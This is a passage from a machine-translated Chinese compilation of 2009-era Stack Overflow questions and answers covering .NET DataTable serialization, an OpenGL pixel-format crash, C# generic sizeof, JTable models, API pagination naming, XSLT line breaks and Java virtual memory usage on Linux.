    Dim colCheck As New DataGridViewCheckBoxColumn
    Dim colText As New DataGridViewTextBoxColumn
    Dim colCombo As New DataGridViewComboBoxColumn

    '...etc, also available are DataGridViewImageColumn, DataGridViewButtonColumn, DataGridViewLinkColumn

    'Change the column properties as you need

    colCheck.HeaderText = "Header Text"
    colCheck.Width = 300

    'Add the columns to the grid 

    Me.DataGridView1.Columns.Add(colCheck)
    Me.DataGridView1.Columns.Add(colText)
    Me.DataGridView1.Columns.Add(colCombo)
End Sub 
```

# c# - 我可以序列化数据表或数据集以通过 C# 中的 Web 服务传输吗？

> ID：561203
> 
> 赞同：11
> 
> 时间：2009-02-18T14:16:15.537
> 
> 标签：c#, web-services

我正在使用 Web 服务从表中查询数据。然后我必须将它发送给想要它作为 DataTable 的用户。我可以序列化数据吗？或者我应该将它作为数据集发送。我是 Web 服务的新手，所以我不确定最好的方法。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-18T14:24:44.000

您可以通过以下方式将数据作为数据集中的 xml 字符串发送`DataSet.GetXml()`

并且用户可以使用反序列化它`DataSet.ReadXml()`

并通过以下方式从数据集中获取数据表`DataSet.Tables`

祝你好运

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-02-18T14:19:58.600

如果您将它公开为`DataSet`/ `DataTable`，它无论如何都会进行自己的序列化（通过`IXmlSerializable`，IIRC）。请注意，如果您希望服务可移植到其他模式（即 java 客户端等），则`DataSet`/`DataTable`不要在 Web 服务上使用良好的数据类型。但是如果你愿意，你*可以*简单地暴露它......; .NET 将处理翻译。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-02-18T14:23:47.297

请参阅Richard Blewett 的[这篇文章](http://www.dotnetconsult.co.uk/weblog2/2009/01/23/WCFMessagesAndDataSetsHellipOhMy.aspx)，了解您可能不想这样做的原因。

**编辑：** 总结以上内容：

*   使用`DataSet`不可互操作。它使用的注释只有在链接的每一端都使用 Microsoft 堆栈时才有意义。
*   `DataSet`是一个用于通过网络发送数据的非常低效的类 - 它还包含更改跟踪数据和元数据。
*   它引入了紧密耦合——在服务端所做的甚至可能不需要客户端的更改也必须反映在客户端。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-02-18T14:19:36.290

当然。DataTable 和 DataSet 都是可序列化的，它们还具有您可以使用的 ReadXml() 和 WriteXml() 函数。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2011-05-05T08:28:40.493

DataTable 是可序列化的，但存在一些技巧来通过 WebService 返回无类型的 DataTable。

在 Web 服务方法返回填充的 DataTable（在服务端）之前，它必须分配属性 TableName。如果在 OperationContract DataTable 内部接收到类型化 DataTable 的引用，则序列化将失败，并显示诸如“”服务器未提供有意义的回复；这可能是由于合同不匹配、会话过早关闭或内部服务器错误造成的”。

这意味着您应该填充创建的 DataTable，例如使用方法 Merge（或手动）。这是这样的 DataContract 实现示例；

```
DataTable IHorizonCLService.RetrieveChangeLog(int iId)
{
   DataTable dt = new DataTable(); //create new DataTable to be returned by this web method
   dt.Merge(HorMan.RetrieveChangeLog(iId)); //get typed DataTable and fills the DataTable 
   dt.TableName = "SurChangeLogHor"; //assigns name
   return dt;
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-18T14:18:54.810

您可以通过 Web 服务传输 DataTable。所以这可能是你最好的选择，因为这是客户要求的。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-18T14:28:12.777

最简单且最具互操作性的方法是使用 GetXml() 方法将数据集序列化为 XML，然后将其作为字符串从 Web 服务传递。然后，客户端可以使用 ReadXml() 方法对其进行反序列化。

我们已经使用了以这种方式完成的服务，并且效果很好。

另一种方法是在服务中公开 DataSet 类，并返回数据集对象。但这会使事情复杂化，特别是如果任何客户端都不是.NET。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-04-26T08:44:17.653

只是[这里的一个有趣的评论](http://www.netfxharmonics.com/2008/11/Understanding-WCF-Services-in-Silverlight-2)

> 而且，永远永远不会通过网络发送 System.Data.DataSet 的实例。从来没有，现在也没有，也永远不会有任何理由将这种类型的任何实例发送到任何地方。它超出了海量，使 10,000 个属性数据传输对象看起来很轻巧。某些东西是可序列化的事实并不意味着它应该是。

# .net - 如何在部分信任环境中访问我的程序集版本号（无 FileIOPermission）

> ID：561211
> 
> 赞同：3
> 
> 时间：2009-02-18T14:18:13.813
> 
> 标签：.net, reflection, cas, partial-trust

我正在尝试在运行时访问我的程序集的版本号。

我使用的代码需要 FileIOPermission，我不想授予（我在 Internet 区域）

```
this.GetType().Assembly.GetName().Version; 
```

是否有另一种方法可以访问不需要提升的版本号？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T14:43:37.717

它不是完全相同的版本号（它是“AssemblyFileVersion”而不是“AssemblyVersion”属性），但您可以使用以下代码行：

```
System.Windows.Forms.Application.ProductVersion 
```

这将返回一个字符串。

如果您正在进行自动构建，那么您必须记住增加这两个数字。

*或者*

如果您作为 ClickOnce 应用程序执行此操作，则可以在以下位置找到版本号：

```
System.Deployment.Application.ApplicationDeployment.CurrentDeployment.CurrentVersion 
```

希望有帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T14:58:21.300

如果您需要没有 FileIOPermission 的 AssemblyVersion，则必须解析 Assembly::FullName。

# sql-server - Visual Studio Professional 是否附带 SQL Server Developer（不是 Express）版本？

> ID：561212
> 
> 赞同：2
> 
> 时间：2009-02-18T14:18:17.760
> 
> 标签：sql-server, visual-studio, sql-server-2005, visual-studio-2005

我和同事对此意见不一。他认为我们有 SQL Developer 的许可证，因为我们购买了 VS 2005 Professional。自从我安装它已经有一段时间了，但我不记得它是安装的一部分。它一直是单独的安装和许可。去过 MS VS 站点，但在任何地方都找不到任何关于它与 SQL Server 一起出现的信息。我认为他指的是 MS 发布活动，其中 VS 和 SQL 作为发布的一部分一起出现。

有谁肯定知道吗？提前致谢。

我应该补充一点，sql express 和 sql developer 之间是有区别的。我认为快递已经捆绑了各种各样的东西。SQL Developer 基本上是面向开发人员的企业版。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-03T22:56:07.350

我购买了 Microsoft Visual Studio 2005 专业版 (C5E-00001)。包装盒中包含 2 张用于安装 Visual Studio 的 CD、3 张用于 MSDN 库的 CD、1 张用于安装 Microsoft SQL Server 2005 开发人员版（32 位和 64 位）的 DVD、用于 Visual Studio Pro 的产品密钥、用于 SQL Server 开发人员版的产品密钥2005 年，一个海报包，其中包含一些令人敬畏的海报，可以用来引火，还有一本手册。

这是 2006 年的 Visual Studio 2005 产品比较页面的链接：

[http://web.archive.org/web/20060209025444/msdn.microsoft.com/vstudio/products/compare/default.aspx](http://web.archive.org/web/20060209025444/msdn.microsoft.com/vstudio/products/compare/default.aspx)

简而言之：如果您购买 Pro 版或 Team 版，您实际上将收到 MS SQL 2005 Developer（32 位和 64 位）DVD 和密钥。

祝你好运，我希望这会有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T14:18:56.073

我最近购买了 VS2008 Pro（升级版），它带有 SQL 2005 Dev 版本。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T14:19:42.750

我很确定 VS2005 和 VS2008 附带了 SQL Server 2005 Express Edition。

当您安装 VS2008 时，我知道 machine.config 获取默认本地 SQLEXPRESS 实例的连接字符串条目。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T14:23:44.847

我们公司几年前买了VS 2005 Pro，盒子里肯定有SQL 2005 Dev edition的副本。这是在南非 - 不确定其他国家。

# java - 在 servlet 中显示图像

> ID：561215
> 
> 赞同：-1
> 
> 时间：2009-02-18T14:18:53.860
> 
> 标签：java

我有以下要求。当用户单击按钮时，应显示图像。我尝试过的以下代码给了我错误

```
 Toolkit tk = Toolkit.getDefaultToolkit();
    Image ima = Toolkit.getImage("C:\\DB.jpg");
    MediaTracker mt = new MediaTracker(new Canvas());
    mt.addImage(ima, 0);
    try 
    {
        mt.waitForAll();
    }
    catch(Exception x)  {}
    OutputStream os = res.getOutputStream();
    // Now create a writable image,
    BufferedImage bi = new BufferedImage(ima.getWidth(null), ima.getHeight(null), BufferedImage.TYPE_INT_RGB);
    bi.drawImage(ima, 0, 0, null); // Draw the loaded image onto a writable thing
    JPEGImageEncoder je = JPEGCodec.createJPEGEncoder(os);
    je.encode(ima);
    os.close();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T15:06:28.567

在打电话之前`res.getOutputStream()`，您是否首先确定您已经打过电话`res.setContentType("image/jpeg")`？

# c++ - C++ 中的 OpenGL - 运行时崩溃

> ID：561224
> 
> 赞同：0
> 
> 时间：2009-02-18T14:20:16.133
> 
> 标签：c++, visual-studio, opengl

我正在 Visual Studio 2005 中使用 C++ 开发一些 OpenGL。

```
// SetUpOpenGL sets the pixel format and a rendering
// context then returns the RC
HGLRC COpenGLBaseWnd::SetUpOpenGL(HWND hwnd)
{
    static PIXELFORMATDESCRIPTOR pfd = 
    {
        sizeof (PIXELFORMATDESCRIPTOR), // strcut size 
        1,                              // Version number
        PFD_DRAW_TO_WINDOW |    // Flags, draw to a window,
            PFD_DOUBLEBUFFER |    // enable double buffering
            PFD_SUPPORT_OPENGL, // use OpenGL
        PFD_TYPE_RGBA,          // RGBA pixel values
        24,                     // 24-bit color
        0, 0, 0,                // RGB bits & shift sizes.
        0, 0, 0,                // Don't care about them
        0, 0,                   // No alpha buffer info
        0, 0, 0, 0, 0,          // No accumulation buffer
        32,                     // 32-bit depth buffer
        0,                      // No stencil buffer
        0,                      // No auxiliary buffers
        PFD_MAIN_PLANE,         // Layer type
        0,                      // Reserved (must be 0)
        0,                      // No layer mask
        0,                      // No visible mask
        0                       // No damage mask
    };

    pCDC = pWnd->GetDC();
    hDC = pCDC->GetSafeHdc();

    PixelFormatID = ChoosePixelFormat(hDC, &pfd);

    if (!PixelFormatID)
    {
        // catch errors here.
        // If nMyPixelFormat is zero, then there's
        // something wrong... most likely the window's
        // style bits are incorrect (in CreateWindow() )
        // or OpenGl isn't installed on this machine
        //printf("ChoosePixelFormat Failed %d\r\n",GetLastError());
        abort();
        exit(-1);
    }

    if (pfd.dwFlags & PFD_NEED_PALETTE)
    {
        //printf("Choosen Pixel Format requires a palette.\r\n");
        abort();
        exit(-1);
    }

   SetPixelFormat(hDC, PixelFormatID, &pfd); 
```

* * *

并且 SetPixelFormat 调用在运行时会发生爆炸。烦人的是，它只会在我的机器上崩溃，而不是在我同事的机器上。

我在 stackoverflow 上找到[了这个看起来相关的答案](https://stackoverflow.com/questions/199016/wglcreatecontext-in-c-failing-but-not-in-managed-c/206933#206933)，但要么我不知道如何在 C++ 中使用此信息解决问题，要么不是同一个问题。

我需要有关如何在 C++ 或其他潜在解决方案中实现该解决方案的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-19T06:39:38.823

确保在创建窗口类时，`CS_PARENTDC`未指定且`CS_OWNDC`is。

是否`SetPixelFormat()`检测到 DC 是共享的（弄乱上述任一标志的影响）我不知道，但除非窗口具有专用的 hDC 值，否则 OpenGL 将无法正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T14:51:58.350

检查您的指针是否为 NULL。

您的视频卡可能不支持指定的像素格式。尝试其他设置。你有什么视频卡？与它工作的另一个相比。

pWnd 从何而来？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T17:55:48.393

您提到了链接器错误和崩溃。你能检查你的目标文件是否有它崩溃的函数的定义吗？您是否使用`lib`了 OpenGL 链接的权利？

# c# - 值类型的字节宽度

> ID：561227
> 
> 赞同：0
> 
> 时间：2009-02-18T14:20:29.223
> 
> 标签：c#, generics

我想将一个值类型传递给一个函数，并将其设置为在变量的整个宽度上重复的位模式（FF、AA 等）。现在，我正在传递价值

void foo(T val) 其中 T : 结构

所以我可以使用任何值类型。问题是，编译器不允许我使用 sizeof(T)，因为 T 可能是引用类型（除了它*不能*，这要归功于“where”约束）。我可以对所有值类型进行硬编码并自己检查它们，但这显然看起来有点矫枉过正。有没有更简单的方法来做到这一点？

澄清一下：如果我通过了`byteInt64`，我想将它设置为 0xFFFFFFFF。

我试过`Convert.ChangeType(0xFFFFFFFF, typeof(T))`了，但它会抛出 if `val`is eg a Char。我可以通过以下方式解决问题：a）弄清楚类型参数的宽度并“构建”一个足够大的值来填充，b）弄清楚如何接受任何值类型（并且只有值类型），例如 sizeof () 将起作用，或者 c) 弄清楚如何自动将 0xFFFFFFFF 截断为变量的正确宽度。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T14:27:24.963

你可以使用 Marshal.SizeOf 方法吗？

[http://msdn.microsoft.com/en-us/library/y3ybkfb3.aspx](http://msdn.microsoft.com/en-us/library/y3ybkfb3.aspx)

编辑：注意！在实际执行此操作之前阅读 Tor Haugen 的评论。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T14:45:11.597

您也可以将 -1 作为您正在传递的任何内容。无论变量的长度如何，-1 总是全是 F。只要您使用原始类型，这永远不会真正引起太多问题。

快速解释为什么会这样：

系统中的所有整数都以 2 的补码表示。这意味着负数不仅仅是带有符号位的数字。要创建 2 的补码，只需翻转所有位并加 1。

尔格：

-1 = 不是 (1) + 1

所以

0000 0001 > 1111 1110 > 1111 1111 = 0xFF

对于任何长度的项目，这将始终为您提供全 1。

编辑：

使用[sizeof](http://msdn.microsoft.com/en-us/library/eahchzkf(VS.71).aspx)运算符获取类型的大小（以字节为单位），使用[typeof](http://msdn.microsoft.com/en-us/library/58918ffs(VS.71).aspx)获取类型，然后我会在循环中使用位移来填充项目...

```
for (int i = 0; i < sizeof(typeof(input)); i++) 
{
  input = (input << 8) | Ox<Pattern>
} 
```

请原谅我的语法错误，已经有一段时间了，但这应该可以满足您的要求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T14:25:23.890

您可以使用二进制序列化来获取大小，但您必须序列化对象的两个数组，一个包含两个元素，一个包含一个元素，然后从另一个中减去一个大小以消除序列化开销。请注意像 System.Decimal 这样的类型，它们对于不同的值具有不同的序列化长度。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T15:42:39.337

我以为我在做一些事情- sizeof() 将适用于结构，但仅适用于不安全的块。所以我尝试了：

```
// compile with /unsafe
public unsafe void Foo<T>(T val) where T : struct
{
    // Works!
    int size1 = sizeof(SomeStruct);
    // Doesn't work, alas
    int size2 = sizeof(T);
} 
```

似乎 sizeof 存在泛型类型参数的问题。所以不去了。

正如我在 norheim.se 的回答中评论的那样，您应该知道 Marshal.SizeOf() 不一定会在运行时为您提供类型的大小，所以我不推荐它。

冒着因不优雅而被嘲笑的风险，我会诚实地考虑一个简单的`switch`陈述。如果您的值类型将是 stock `int`s、`long`s、`byte`s 等，则存在可管理的可能性。您应该记住，设置位模式可能是一项不同的任务，具体取决于类型是否已签名！切换将使处理此类事件变得容易。

# java - JTable、TableModel和TableData之间的关系

> ID：561231
> 
> 赞同：5
> 
> 时间：2009-02-18T14:21:26.053
> 
> 标签：java, swing, jtable

[`JTable`](http://java.sun.com/javase/6/docs/api/javax/swing/JTable.html)a和[`TableModel`](http://java.sun.com/javase/6/docs/api/javax/swing/table/TableModel.html)之间有什么关系`TableData`？如果我只是修改`TableData`, 是否也会更改组件上的数据显示，`JTable`或者我必须调用一些方法来同步两者。我看过[这个](http://java.sun.com/docs/books/tutorial/uiswing/components/table.html)，但它没有明确告诉或显示更新方面的关系

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-18T14:32:06.293

当您更改 TableModel 数据中的值时，您必须触发此事件。例如。更改一个单元格的值，您调用`fireTableCellUpdated(row, col);`.

更具体地看[这个。](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#fire)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T14:34:41.997

我假设您使用的短语“TableData”仅表示 JTable 中显示的数据。要回答您的问题，您是否看到自动更新取决于您的 TableModel 以及它如何与您的数据交互。

当底层数据模型发生变化时，TableModel 应该触发事件，这反过来会通知 JTable 发生了变化并且应该重绘它。所以就关系而言，JTable 监听 TableModel 上的事件变化；TableModel 不了解 JTable。

根据模型的组织方式，它下面的数据可能会在 TableModel 不知道的情况下发生变化。在这种情况下，如果您有从 TableModel 到数据的直接传递，当自然发生重绘（屏幕调整大小、鼠标移动等）时，屏幕上的值会发生变化，但是如果您想强制事件，您应该得到TableModel 通过上述事件通知 JTable。在关系方面，TableModel 知道表数据，但表数据不知道模型（通常）。TableModel 可能会也可能不会监听数据的变化。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-18T14:37:23.190

在 JTable 中设置 TableModel 时，该表会添加一个观察者 ( [TableModelListener](http://java.sun.com/javase/6/docs/api/javax/swing/event/TableModelListener.html) ) 以了解模型中的更改。

当更改模型中的数据时，模型应该通过触发[TableModelEvent](http://java.sun.com/javase/6/docs/api/javax/swing/event/TableModelEvent.html)来通知注册的侦听器。事件本身可以包含有关更改粒度的补充信息（无论是结构显着更改，还是仅更改某些单元格数据），以允许 JTable 进行优化的视图更新。

# api - 用于限制结果的 API 命名？

> ID：561232
> 
> 赞同：1
> 
> 时间：2009-02-18T14:21:44.070
> 
> 标签：api, parameters, naming

在我们的办公室，我们正在激烈讨论如何在我们的公共 API 中命名一些参数。

在我们为某种列表提供 getter 的任何地方，我们都希望能够限制结果（用于分页）。

即：`getPosts/getNews/getUsers/.../`应该能够返回项目 0 到 25、50 到 100 等。所以，我们需要两个参数。第一个参数是我们开始的地方，第二个参数是我们结束的地方。

那么，第二个参数应该是绝对的还是相对的？（应该 50,75 退回物品 50-75 还是 50-125？）

我们已经决定了相对，所以第二个参数告诉我们要返回多少项目。

棘手的部分是以清晰一致的方式命名。到目前为止，我们提出的那些：

第一的：

```
start/index/offset/page/pageindex 
```

第二：

```
amount/count/maxcount/limit/perpage/pagesize 
```

每个建议都有优点和缺点。使用“page”会让人不清楚它是从 0 开始还是从 1 开始。在这方面使用“index”或“offset”会更清楚，但更具技术性（毕竟，99% 的用户都在使用它进行分页）时间）。

我想这是非常主观的，但我正在寻找明确的利弊，以及好的 API 的示例以及它们使用的内容。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T14:26:00.223

我会选择相对的，它更容易掌握。

关于命名：我喜欢第一个结果的“开始”和结果数量的“计数”。

（但你不是以某种方式混合页面和结果计数吗？）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T14:32:27.010

绝对去相对。我称它们为“索引”和“计数”。通常我会使用“长度”，但它似乎不适合你所描述的。如果你想让它类似于 linq，你可以调用参数“skip”和“take”。对于将要查看结果 URL 的 Joe Average 人来说，这些术语也更容易理解。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T14:35:35.847

我会去

```
getPosts(startIndex, count) 
```

# xslt - xslt仅在一个节点中替换 \n ？

> ID：561235
> 
> 赞同：8
> 
> 时间：2009-02-18T14:23:14.410
> 
> 标签：xslt

嘿，我有一个节点 <msg> 包含一条消息，例如

> 字符串
> 1 字符串 2
> 刺 3

但是，当它渲染时，它会渲染所有一行我如何用 <br /> 替换所有 \n。

我试过了

> <xsl:value-of select='replace(msg, " ", "<br/>")' />

但我得到这个错误

> 加载样式表时出错：XSLT/XPath 函数无效。

我该怎么做呢？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-02-18T14:49:40.353

在要处理的字符串上调用此模板：

```
<xsl:template name="break">
  <xsl:param name="text" select="string(.)"/>
  <xsl:choose>
    <xsl:when test="contains($text, '&#xa;')">
      <xsl:value-of select="substring-before($text, '&#xa;')"/>
      <br/>
      <xsl:call-template name="break">
        <xsl:with-param 
          name="text" 
          select="substring-after($text, '&#xa;')"
        />
      </xsl:call-template>
    </xsl:when>
    <xsl:otherwise>
      <xsl:value-of select="$text"/>
    </xsl:otherwise>
  </xsl:choose>
</xsl:template> 
```

像这样（它将在当前节点上工作）：

```
<xsl:template match="msg">
  <xsl:call-template name="break" />
</xsl:template> 
```

或者像这样，显式传递一个参数：

```
<xsl:template match="someElement">
  <xsl:call-template name="break">
    <xsl:with-param name="text" select="msg" />
  </xsl:call-template>
</xsl:template> 
```

我认为您正在使用 XSLT 1.0 处理器，而 replace() 是 XSLT/XPath 2.0 中引入的函数。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2016-01-08T09:17:09.880

你也可以通过简单的 HTML 标签来实现，在你的 msg 之前
尝试这个`<pre>`标签并在 msg 之后关闭它。

```
<pre>
Jayakumar Kulkarni (Consultant) :
Remark

Jayakumar Kulkarni :
Rematr 01

Jayakumar Kulkarni :
comment</pre> 
```

# java - Linux下Java的虚拟内存使用情况，使用的内存过多

> ID：561245
> 
> 赞同：286
> 
> 时间：2009-02-18T14:24:48.277
> 
> 标签：java, linux, memory, virtual-memory

我对在 Linux 下运行的 Java 应用程序有疑问。

当我使用默认的最大堆大小 (64 MB) 启动应用程序时，我看到使用 tops 应用程序为应用程序分配了 240 MB 的虚拟内存。这会给计算机上的其他一些软件带来一些问题，这些软件资源相对有限。

据我了解，保留的虚拟内存无论如何都不会被使用，因为一旦我们达到堆限制，`OutOfMemoryError`就会抛出一个。我在 windows 下运行了相同的应用程序，我看到虚拟内存大小和堆大小相似。

无论如何，我可以为 Linux 下的 Java 进程配置正在使用的虚拟内存吗？

**编辑1**：问题不在于堆。问题是，如果我设置一个 128 MB 的堆，例如，Linux 仍然分配 210 MB 的虚拟内存，这永远不需要。**

**编辑 2**：使用`ulimit -v`允许限制虚拟内存的数量。如果设置的大小低于 204 MB，则应用程序将不会运行，即使它不需要 204 MB，只需要 64 MB。所以我想了解为什么 Java 需要这么多虚拟内存。这可以改变吗？

**编辑 3**：系统中运行着其他几个应用程序，这些应用程序是嵌入式的。而且系统确实有虚拟内存限制（来自评论，重要细节）。

* * *

## 回答 #1

> 赞同：685
> 
> 时间：2009-02-18T15:17:07.777

这一直是对 Java 的长期抱怨，但它在很大程度上毫无意义，并且通常基于查看错误的信息。通常的措辞类似于“Java 上的 Hello World 需要 10 兆字节！为什么需要它？” 好吧，这是一种让 64 位 JVM 上的 Hello World 声称占用 4 GB 的方法……至少通过一种测量形式。

```
java -Xms1024m -Xmx4096m com.example.Hello

```

# 测量内存的不同方法

在 Linux 上，[top](http://linux.die.net/man/1/top)命令为您提供了几个不同的内存数字。以下是关于 Hello World 示例的说明：

```
  PID 用户 PR NI VIRT RES SHR S %CPU %MEM TIME+ 命令
 2120 kgregory 20 0 4373m 15m 7152 S 0 0.2 0:00.10 爪哇

```

*   VIRT 是虚拟内存空间：虚拟内存映射中所有内容的总和（见下文）。它在很大程度上是没有意义的，除非它不是（见下文）。
*   RES 是驻留集大小：当前驻留在 RAM 中的页数。在几乎所有情况下，这是您在说“太大”时应该使用的唯一数字。但这仍然不是一个很好的数字，尤其是在谈到 Java 时。
*   SHR 是与其他进程共享的常驻内存量。对于 Java 进程，这通常仅限于共享库和内存映射 JAR 文件。在这个例子中，我只运行了一个 Java 进程，所以我怀疑 7k 是操作系统使用的库的结果。
*   SWAP 默认情况下未打开，因此此处未显示。它指示当前驻留在磁盘上的虚拟内存量，*无论它实际上是否在交换空间*中。操作系统非常擅长将活动页面保留在 RAM 中，交换的唯一方法是 (1) 购买更多内存，或 (2) 减少进程数量，因此最好忽略这个数字。

Windows 任务管理器的情况要复杂一些。在 Windows XP 下，有“Memory Usage”和“Virtual Memory Size”列，但[官方文档](http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/taskman_whats_there_w.mspx?mfr=true)没有说明它们的含义。Windows Vista 和 Windows 7 添加了更多列，并且它们实际上已[记录在案](http://windows.microsoft.com/en-US/windows7/see-details-about-your-computers-performance-using-task-manager)。其中，“工作集”测量是最有用的；它大致对应于 Linux 上 RES 和 SHR 的总和。

# 了解虚拟内存映射

进程消耗的虚拟内存是进程内存映射中所有内容的总和。这包括数据（例如，Java 堆），还包括程序使用的所有共享库和内存映射文件。在 Linux 上，您可以使用[pmap](http://linux.die.net/man/1/pmap)命令查看映射到进程空间的所有内容（从这里开始，我将仅提及 Linux，因为它是我使用的；我确信有等效的工具用于视窗）。这是“Hello World”程序的内存映射的摘录；整个内存映射超过 100 行，拥有一千行列表并不罕见。

```
0000000040000000 36K rx--/usr/local/java/jdk-1.6-x64/bin/java
0000000040108000 8K rwx-- /usr/local/java/jdk-1.6-x64/bin/java
0000000040eba000 676K rwx-- [匿名]
00000006fae00000 21248K rwx-- [匿名]
00000006fc2c0000 62720K rwx-- [匿名]
0000000700000000 699072K rwx-- [匿名]
000000072aab0000 2097152K rwx-- [匿名]
00000007aaab0000 349504K rwx-- [匿名]
00000007c0000000 1048576K rwx-- [匿名]
...
00007fa1ed00d000 1652K r-xs-/usr/local/java/jdk-1.6-x64/jre/lib/rt.jar
...
00007fa1ed1d3000 1024K rwx-- [匿名]
00007fa1ed2d3000 4K ----- [匿名]
00007fa1ed2d4000 1024K rwx-- [匿名]
00007fa1ed3d4000 4K ----- [匿名]
...
00007fa1f20d3000 164K rx--/usr/local/java/jdk-1.6-x64/jre/lib/amd64/libjava.so
00007fa1f20fc000 1020K ----- /usr/local/java/jdk-1.6-x64/jre/lib/amd64/libjava.so
00007fa1f21fb000 28K rwx--/usr/local/java/jdk-1.6-x64/jre/lib/amd64/libjava.so
...
00007fa1f34aa000 1576K rx--/lib/x86_64-linux-gnu/libc-2.13.so
00007fa1f3634000 2044K ----- /lib/x86_64-linux-gnu/libc-2.13.so
00007fa1f3833000 16K rx--/lib/x86_64-linux-gnu/libc-2.13.so
00007fa1f3837000 4K rwx-- /lib/x86_64-linux-gnu/libc-2.13.so
...

```

格式的快速解释：每一行都以段的虚拟内存地址开始。接下来是段大小、权限和段的来源。最后一项是文件或“anon”，表示通过[mmap](http://linux.die.net/man/2/mmap)分配的内存块。

从顶部开始，我们有

*   JVM 加载程序（即在您键入 时运行的程序`java`）。这是非常小的；它所做的只是加载到存储真实 JVM 代码的共享库中。
*   一堆保存 Java 堆和内部数据的匿名块。这是一个 Sun JVM，所以堆被分成多代，每一代都是它自己的内存块。注意JVM根据`-Xmx`值分配虚拟内存空间；这允许它有一个连续的堆。该`-Xms`值在内部用于说明程序启动时有多少堆“正在使用”，并在接近该限制时触发垃圾收集。
*   内存映射的 JAR 文件，在本例中是保存“JDK 类”的文件。当您对 JAR 进行内存映射时，您可以非常有效地访问其中的文件（而不是每次从头开始读取）。Sun JVM 将对类路径上的所有 JAR 进行内存映射；如果您的应用程序代码需要访问 JAR，您还可以对其进行内存映射。
*   两个线程的每线程数据。1M 块是线程栈。我对 4k 块没有很好的解释，但@ericsoe 将其识别为“保护块”：它没有读/写权限，因此如果访问会导致段错误，JVM 会捕获并翻译它到一个`StackOverFlowError`。对于一个真正的应用程序，你会看到数十个甚至数百个这样的条目在内存映射中重复出现。
*   保存实际 JVM 代码的共享库之一。其中有几个。
*   C 标准库的共享库。这只是 JVM 加载的许多不属于 Java 的内容之一。

共享库特别有趣：每个共享库至少有两个段：一个包含库代码的只读段，一个包含库的全局每个进程数据的读写段（我不知道没有权限的段是；我只在 x64 Linux 上看到过）。库的只读部分可以在所有使用该库的进程之间共享；比如`libc`有1.5M的虚拟内存空间可以共享。

# 虚拟内存大小何时重要？

虚拟内存映射包含很多东西。其中一些是只读的，一些是共享的，还有一些是已分配但从未接触过的（例如，本示例中几乎所有的 4Gb 堆）。但是操作系统足够智能，可以只加载它需要的东西，所以虚拟内存大小在很大程度上是无关紧要的。

虚拟内存大小很重要的地方是，如果您在 32 位操作系统上运行，您只能分配 2Gb（或在某些情况下为 3Gb）的进程地址空间。在这种情况下，您正在处理稀缺资源，并且可能必须做出权衡，例如减少堆大小以便内存映射大文件或创建大量线程。

但是，鉴于 64 位机器无处不在，我认为用不了多久虚拟内存大小就会成为一个完全不相关的统计数据。

# 居民集大小何时重要？

驻留集大小是实际在 RAM 中的那部分虚拟内存空间。如果您的 RSS 增长到您的总物理内存的很大一部分，那么可能是时候开始担心了。如果您的 RSS 增长到占用您所有的物理内存，并且您的系统开始交换，那么现在就该开始担心了。

但 RSS 也具有误导性，尤其是在负载较轻的机器上。操作系统不会花费很多精力来回收进程使用的页面。这样做几乎没有什么好处，而且如果进程在未来接触到页面，则可能会出现代价高昂的页面错误。因此，RSS 统计信息可能包含大量未使用的页面。

# 底线

除非您正在交换，否则不要过分关注各种内存统计信息告诉您的内容。需要注意的是，不断增长的 RSS 可能表示某种内存泄漏。

对于 Java 程序，关注堆中发生的事情要重要得多。占用的空间总量很重要，您可以采取一些步骤来减少它。更重要的是您在垃圾收集上花费的时间，以及堆的哪些部分被收集。

访问磁盘（即数据库）很昂贵，而内存很便宜。如果您可以用一个换另一个，那么就这样做。

* * *

## 回答 #2

> 赞同：47
> 
> 时间：2015-03-09T04:17:31.977

Java 和 glibc >= 2.10（包括 Ubuntu >= 10.04，RHEL >= 6）存在一个已知问题。

解决方法是设置这个环境。多变的：

```
export MALLOC_ARENA_MAX=4 
```

如果您正在运行 Tomcat，则可以将其添加到`TOMCAT_HOME/bin/setenv.sh`文件中。

对于 Docker，将其添加到 Dockerfile

```
ENV MALLOC_ARENA_MAX=4 
```

有一篇关于设置 MALLOC_ARENA_MAX 的 IBM 文章 [https://www.ibm.com/developerworks/community/blogs/kevgrig/entry/linux_glibc_2_10_rhel_6_malloc_may_show_excessive_virtual_memory_usage?lang=en](https://www.ibm.com/developerworks/community/blogs/kevgrig/entry/linux_glibc_2_10_rhel_6_malloc_may_show_excessive_virtual_memory_usage?lang=en)

[这篇博文说](https://web.archive.org/web/20161228221330/https://infobright.com/blog/malloc_arena_max/)

